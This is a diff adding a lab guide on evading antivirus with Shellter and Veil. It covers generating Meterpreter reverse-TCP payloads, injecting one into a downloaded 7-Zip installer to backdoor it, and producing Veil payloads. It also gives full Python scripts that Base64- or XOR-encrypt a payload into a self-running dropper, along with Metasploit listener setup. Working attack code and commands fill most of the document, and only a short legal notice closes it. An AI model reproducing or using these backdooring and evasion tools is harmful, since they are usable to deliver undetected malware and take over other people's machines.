@@ -1,0 +1,601 @@
+Evade AV with Shellter and Veil
+Objectives
+By the end of this lab, students will be able to:
+
+Understand the fundamentals of antivirus evasion techniques
+Use Shellter to inject payloads into legitimate executables
+Generate obfuscated payloads using Veil framework
+Automate the obfuscation process using Python scripts
+Analyze the effectiveness of different evasion methods
+Implement advanced payload encoding and encryption techniques
+Prerequisites
+Before starting this lab, students should have:
+
+Basic understanding of Linux command line operations
+Familiarity with penetration testing concepts
+Knowledge of Metasploit framework basics
+Understanding of executable file formats (PE, ELF)
+Basic Python programming knowledge
+Awareness of antivirus detection mechanisms
+Lab Environment
+Al Nafi provides pre-configured Linux-based cloud machines with all necessary tools installed. Simply click Start Lab to access your dedicated environment. No additional VM setup required.
+
+Task 1: Use Shellter to Inject a Payload into a Legitimate Executable
+Subtask 1.1: Environment Setup and Tool Verification
+First, verify that all required tools are available on your system:
+
+# Check if Shellter is installed
+which shellter
+
+# Check if Wine is properly configured
+wine --version
+
+# Check if Metasploit is available
+msfconsole --version
+
+# Update the system and tools
+sudo apt update && sudo apt upgrade -y
+If any tools are missing, install them:
+
+# Install Shellter and dependencies
+sudo apt install shellter wine winetricks -y
+
+# Configure Wine for 32-bit applications
+sudo dpkg --add-architecture i386
+sudo apt update
+sudo apt install wine32 -y
+
+# Initialize Wine configuration
+winecfg
+Subtask 1.2: Download a Legitimate Executable
+Download a legitimate Windows executable to use as a carrier:
+
+# Create working directory
+mkdir -p ~/av_evasion_lab
+cd ~/av_evasion_lab
+
+# Download a legitimate executable (using wget)
+wget https://www.7-zip.org/a/7z1900.exe -O legitimate_app.exe
+
+# Verify the download
+ls -la legitimate_app.exe
+file legitimate_app.exe
+Subtask 1.3: Generate Metasploit Payload
+Create a Metasploit payload that will be injected:
+
+# Generate a reverse TCP payload
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f raw -o payload.bin
+
+# Verify payload creation
+ls -la payload.bin
+hexdump -C payload.bin | head -10
+Subtask 1.4: Use Shellter for Payload Injection
+Launch Shellter and inject the payload:
+
+# Start Shellter in automatic mode
+shellter
+When Shellter starts, follow these steps:
+
+Choose A for Automatic mode
+Provide the path to your legitimate executable: legitimate_app.exe
+Enable Stealth Mode: Y
+Select payload type: L (Listed)
+Choose 1 for Meterpreter_Reverse_TCP
+Set LHOST: 127.0.0.1
+Set LPORT: 4444
+Let Shellter complete the injection process
+Subtask 1.5: Verify Shellter Output
+Check the results of the injection:
+
+# List files to see the backdoored executable
+ls -la
+
+# Compare file sizes
+ls -lh legitimate_app.exe*
+
+# Create a backup of the original
+cp legitimate_app.exe backdoored_app.exe
+Task 2: Generate a Veil Payload to Bypass AV Detection
+Subtask 2.1: Install and Configure Veil
+Set up the Veil framework:
+
+# Clone Veil from GitHub
+cd ~/av_evasion_lab
+git clone https://github.com/Veil-Framework/Veil.git
+
+# Navigate to Veil directory
+cd Veil/
+
+# Run the setup script
+sudo ./config/setup.sh --force --silent
+
+# Start Veil
+./Veil.py
+Subtask 2.2: Generate Python-based Payload
+Use Veil to create an obfuscated Python payload:
+
+# Start Veil and follow these commands within Veil:
+# 1. Type: use 1 (for Evasion)
+# 2. Type: list (to see available payloads)
+# 3. Type: use python/meterpreter/rev_tcp
+# 4. Type: set LHOST 127.0.0.1
+# 5. Type: set LPORT 5555
+# 6. Type: generate
+# 7. Enter payload name: python_payload
+Here's the complete Veil session:
+
+./Veil.py
+# In Veil prompt:
+use 1
+list
+use python/meterpreter/rev_tcp
+set LHOST 127.0.0.1
+set LPORT 5555
+generate
+# Enter name: python_payload
+Subtask 2.3: Generate PowerShell Payload
+Create a PowerShell-based payload for additional evasion:
+
+# In Veil, generate PowerShell payload:
+use powershell/meterpreter/rev_tcp
+set LHOST 127.0.0.1
+set LPORT 6666
+generate
+# Enter name: powershell_payload
+Subtask 2.4: Examine Generated Payloads
+Review the created payloads:
+
+# Navigate to Veil output directory
+cd /var/lib/veil/output/compiled/
+
+# List generated payloads
+ls -la
+
+# Examine the Python payload
+cat python_payload.py | head -20
+
+# Check PowerShell payload
+ls -la *.bat
+cat *.bat
+Task 3: Automate the Obfuscation Process Using Python
+Subtask 3.1: Create Base64 Encoding Script
+Create a Python script to automate payload encoding:
+
+#!/usr/bin/env python3
+
+import base64
+import os
+import sys
+import random
+import string
+
+def generate_random_string(length=10):
+    """Generate random string for variable names"""
+    return ''.join(random.choices(string.ascii_letters, k=length))
+
+def base64_encode_payload(payload_file):
+    """Encode payload using Base64"""
+    try:
+        with open(payload_file, 'rb') as f:
+            payload_data = f.read()
+        
+        encoded_payload = base64.b64encode(payload_data).decode('utf-8')
+        return encoded_payload
+    except FileNotFoundError:
+        print(f"Error: File {payload_file} not found")
+        return None
+
+def create_obfuscated_script(encoded_payload, output_file):
+    """Create obfuscated Python script"""
+    var1 = generate_random_string()
+    var2 = generate_random_string()
+    var3 = generate_random_string()
+    
+    script_template = f'''#!/usr/bin/env python3
+import base64
+import subprocess
+import tempfile
+import os
+
+def {generate_random_string()}():
+    {var1} = "{encoded_payload}"
+    {var2} = base64.b64decode({var1})
+    
+    with tempfile.NamedTemporaryFile(delete=False, suffix='.exe') as {var3}:
+        {var3}.write({var2})
+        temp_path = {var3}.name
+    
+    try:
+        subprocess.run([temp_path], check=True)
+    finally:
+        os.unlink(temp_path)
+
+if __name__ == "__main__":
+    {generate_random_string()}()
+'''
+    
+    with open(output_file, 'w') as f:
+        f.write(script_template)
+    
+    print(f"Obfuscated script created: {output_file}")
+
+def main():
+    if len(sys.argv) != 3:
+        print("Usage: python3 obfuscator.py <payload_file> <output_file>")
+        sys.exit(1)
+    
+    payload_file = sys.argv[1]
+    output_file = sys.argv[2]
+    
+    print(f"Encoding payload: {payload_file}")
+    encoded_payload = base64_encode_payload(payload_file)
+    
+    if encoded_payload:
+        create_obfuscated_script(encoded_payload, output_file)
+        print("Obfuscation complete!")
+    else:
+        print("Failed to encode payload")
+
+if __name__ == "__main__":
+    main()
+Save this script as obfuscator.py:
+
+cd ~/av_evasion_lab
+nano obfuscator.py
+# Paste the above code and save
+chmod +x obfuscator.py
+Subtask 3.2: Create Advanced XOR Obfuscation Script
+Develop a more sophisticated obfuscation technique:
+
+#!/usr/bin/env python3
+
+import os
+import sys
+import random
+import string
+
+def generate_random_key(length=32):
+    """Generate random XOR key"""
+    return bytes([random.randint(1, 255) for _ in range(length)])
+
+def xor_encrypt(data, key):
+    """XOR encrypt data with key"""
+    encrypted = bytearray()
+    key_len = len(key)
+    
+    for i, byte in enumerate(data):
+        encrypted.append(byte ^ key[i % key_len])
+    
+    return bytes(encrypted)
+
+def create_xor_payload(payload_file, output_file):
+    """Create XOR encrypted payload"""
+    try:
+        with open(payload_file, 'rb') as f:
+            payload_data = f.read()
+        
+        # Generate random key
+        key = generate_random_key()
+        
+        # Encrypt payload
+        encrypted_payload = xor_encrypt(payload_data, key)
+        
+        # Create Python script with encrypted payload
+        var_names = [generate_random_string() for _ in range(5)]
+        
+        script_content = f'''#!/usr/bin/env python3
+import subprocess
+import tempfile
+import os
+
+def {var_names[0]}():
+    {var_names[1]} = {list(key)}
+    {var_names[2]} = {list(encrypted_payload)}
+    
+    {var_names[3]} = bytearray()
+    key_len = len({var_names[1]})
+    
+    for i, byte in enumerate({var_names[2]}):
+        {var_names[3]}.append(byte ^ {var_names[1]}[i % key_len])
+    
+    with tempfile.NamedTemporaryFile(delete=False, suffix='.exe') as {var_names[4]}:
+        {var_names[4]}.write(bytes({var_names[3]}))
+        temp_path = {var_names[4]}.name
+    
+    try:
+        subprocess.run([temp_path], check=True)
+    finally:
+        os.unlink(temp_path)
+
+if __name__ == "__main__":
+    {var_names[0]}()
+'''
+        
+        with open(output_file, 'w') as f:
+            f.write(script_content)
+        
+        print(f"XOR obfuscated payload created: {output_file}")
+        return True
+        
+    except Exception as e:
+        print(f"Error creating XOR payload: {e}")
+        return False
+
+def generate_random_string(length=12):
+    """Generate random string for variable names"""
+    return ''.join(random.choices(string.ascii_letters, k=length))
+
+def main():
+    if len(sys.argv) != 3:
+        print("Usage: python3 xor_obfuscator.py <payload_file> <output_file>")
+        sys.exit(1)
+    
+    payload_file = sys.argv[1]
+    output_file = sys.argv[2]
+    
+    print(f"Creating XOR obfuscated payload from: {payload_file}")
+    
+    if create_xor_payload(payload_file, output_file):
+        print("XOR obfuscation successful!")
+        os.chmod(output_file, 0o755)
+    else:
+        print("XOR obfuscation failed!")
+
+if __name__ == "__main__":
+    main()
+Save this as xor_obfuscator.py:
+
+nano xor_obfuscator.py
+# Paste the above code and save
+chmod +x xor_obfuscator.py
+Subtask 3.3: Create Automated Batch Processing Script
+Develop a script to automate multiple obfuscation techniques:
+
+#!/usr/bin/env python3
+
+import os
+import sys
+import subprocess
+import time
+from pathlib import Path
+
+class PayloadObfuscator:
+    def __init__(self, payload_file):
+        self.payload_file = payload_file
+        self.output_dir = "obfuscated_payloads"
+        self.create_output_directory()
+    
+    def create_output_directory(self):
+        """Create output directory for obfuscated payloads"""
+        Path(self.output_dir).mkdir(exist_ok=True)
+        print(f"Output directory: {self.output_dir}")
+    
+    def run_base64_obfuscation(self):
+        """Run Base64 obfuscation"""
+        output_file = f"{self.output_dir}/base64_payload.py"
+        cmd = ["python3", "obfuscator.py", self.payload_file, output_file]
+        
+        try:
+            subprocess.run(cmd, check=True)
+            print("✓ Base64 obfuscation completed")
+            return True
+        except subprocess.CalledProcessError:
+            print("✗ Base64 obfuscation failed")
+            return False
+    
+    def run_xor_obfuscation(self):
+        """Run XOR obfuscation"""
+        output_file = f"{self.output_dir}/xor_payload.py"
+        cmd = ["python3", "xor_obfuscator.py", self.payload_file, output_file]
+        
+        try:
+            subprocess.run(cmd, check=True)
+            print("✓ XOR obfuscation completed")
+            return True
+        except subprocess.CalledProcessError:
+            print("✗ XOR obfuscation failed")
+            return False
+    
+    def generate_veil_payloads(self):
+        """Generate multiple Veil payloads"""
+        veil_configs = [
+            ("python/meterpreter/rev_tcp", "veil_python"),
+            ("powershell/meterpreter/rev_tcp", "veil_powershell"),
+            ("c/meterpreter/rev_tcp", "veil_c")
+        ]
+        
+        for payload_type, name in veil_configs:
+            print(f"Generating Veil payload: {payload_type}")
+            # Note: This would require Veil automation
+            # For demonstration, we'll create placeholder files
+            placeholder_file = f"{self.output_dir}/{name}.py"
+            with open(placeholder_file, 'w') as f:
+                f.write(f"# Veil payload: {payload_type}\n")
+                f.write(f"# Generated at: {time.ctime()}\n")
+            print(f"✓ Veil payload placeholder created: {name}")
+    
+    def create_summary_report(self):
+        """Create summary report of generated payloads"""
+        report_file = f"{self.output_dir}/obfuscation_report.txt"
+        
+        with open(report_file, 'w') as f:
+            f.write("Payload Obfuscation Report\n")
+            f.write("=" * 30 + "\n\n")
+            f.write(f"Original payload: {self.payload_file}\n")
+            f.write(f"Generation time: {time.ctime()}\n\n")
+            
+            f.write("Generated payloads:\n")
+            for file in os.listdir(self.output_dir):
+                if file.endswith(('.py', '.exe', '.bat')):
+                    file_path = os.path.join(self.output_dir, file)
+                    file_size = os.path.getsize(file_path)
+                    f.write(f"- {file} ({file_size} bytes)\n")
+        
+        print(f"✓ Summary report created: {report_file}")
+    
+    def run_all_obfuscations(self):
+        """Run all obfuscation techniques"""
+        print("Starting automated payload obfuscation...")
+        print("-" * 40)
+        
+        # Run Base64 obfuscation
+        self.run_base64_obfuscation()
+        
+        # Run XOR obfuscation
+        self.run_xor_obfuscation()
+        
+        # Generate Veil payloads
+        self.generate_veil_payloads()
+        
+        # Create summary report
+        self.create_summary_report()
+        
+        print("-" * 40)
+        print("Automated obfuscation completed!")
+        print(f"Check the '{self.output_dir}' directory for results")
+
+def main():
+    if len(sys.argv) != 2:
+        print("Usage: python3 batch_obfuscator.py <payload_file>")
+        sys.exit(1)
+    
+    payload_file = sys.argv[1]
+    
+    if not os.path.exists(payload_file):
+        print(f"Error: Payload file '{payload_file}' not found")
+        sys.exit(1)
+    
+    obfuscator = PayloadObfuscator(payload_file)
+    obfuscator.run_all_obfuscations()
+
+if __name__ == "__main__":
+    main()
+Save this as batch_obfuscator.py:
+
+nano batch_obfuscator.py
+# Paste the above code and save
+chmod +x batch_obfuscator.py
+Subtask 3.4: Test the Automation Scripts
+Run the automation scripts with your generated payloads:
+
+# Test with the original payload
+python3 obfuscator.py payload.bin obfuscated_payload.py
+
+# Test XOR obfuscation
+python3 xor_obfuscator.py payload.bin xor_payload.py
+
+# Run batch obfuscation
+python3 batch_obfuscator.py payload.bin
+
+# Check results
+ls -la obfuscated_payloads/
+cat obfuscated_payloads/obfuscation_report.txt
+Verification and Testing
+Setting Up Metasploit Listeners
+Create listeners to test your payloads:
+
+# Start Metasploit console
+msfconsole
+
+# Set up listener for Shellter payload
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 127.0.0.1
+set LPORT 4444
+run -j
+
+# Set up listener for Veil Python payload
+use exploit/multi/handler
+set payload python/meterpreter/reverse_tcp
+set LHOST 127.0.0.1
+set LPORT 5555
+run -j
+
+# Check active jobs
+jobs -l
+Testing Payload Effectiveness
+Analyze the obfuscated payloads:
+
+# Check file entropy (higher entropy = better obfuscation)
+python3 -c "
+import math
+from collections import Counter
+
+def calculate_entropy(data):
+    if not data:
+        return 0
+    entropy = 0
+    for count in Counter(data).values():
+        p = count / len(data)
+        entropy -= p * math.log2(p)
+    return entropy
+
+with open('payload.bin', 'rb') as f:
+    original = f.read()
+
+with open('obfuscated_payloads/base64_payload.py', 'rb') as f:
+    obfuscated = f.read()
+
+print(f'Original entropy: {calculate_entropy(original):.2f}')
+print(f'Obfuscated entropy: {calculate_entropy(obfuscated):.2f}')
+"
+Troubleshooting Common Issues
+Wine Configuration Issues
+If Shellter fails to run:
+
+# Reconfigure Wine
+winecfg
+
+# Install required Windows components
+winetricks vcrun2019 dotnet48
+
+# Check Wine prefix
+echo $WINEPREFIX
+Veil Installation Problems
+If Veil setup fails:
+
+# Manual dependency installation
+sudo apt install python3-pip python3-dev -y
+pip3 install pycrypto
+
+# Reinstall Veil
+cd ~/av_evasion_lab
+rm -rf Veil/
+git clone https://github.com/Veil-Framework/Veil.git
+cd Veil/
+sudo ./config/setup.sh --force
+Payload Generation Errors
+If payload generation fails:
+
+# Check Metasploit database
+sudo msfdb init
+sudo msfdb start
+
+# Verify network configuration
+ip addr show
+netstat -tlnp | grep :4444
+Security Considerations and Legal Notice
+Important Legal and Ethical Guidelines:
+
+This lab is for educational purposes only
+Only use these techniques in authorized penetration testing environments
+Never use these methods against systems you don't own or lack permission to test
+Always follow responsible disclosure practices
+Ensure compliance with local laws and regulations
+Conclusion
+In this comprehensive lab, you have successfully:
+
+Mastered Shellter Usage: Learned to inject payloads into legitimate executables while maintaining their functionality
+Implemented Veil Framework: Generated multiple types of obfuscated payloads using different programming languages
+Automated Obfuscation Processes: Created Python scripts to automate Base64 and XOR encoding techniques
+Developed Batch Processing: Built comprehensive automation tools for multiple obfuscation methods
+Analyzed Payload Effectiveness: Understood how to measure and improve obfuscation quality
+These skills are essential for red team operators and penetration testers who need to bypass modern antivirus solutions. The techniques learned here demonstrate the cat-and-mouse game between attackers and defenders, highlighting the importance of defense-in-depth strategies.
+
+Key Takeaways:
+
+Multiple Layers of Obfuscation: Combining different techniques increases evasion success rates
+Automation is Critical: Manual obfuscation is time-consuming and error-prone
+Continuous Evolution: AV evasion techniques must constantly evolve as detection improves
+Legitimate Use Cases: These techniques help security professionals test and improve defensive measures
+The knowledge gained from this lab will enhance your ability to conduct thorough security assessments and better understand the techniques used by real-world attackers, ultimately contributing to stronger cybersecurity defenses.
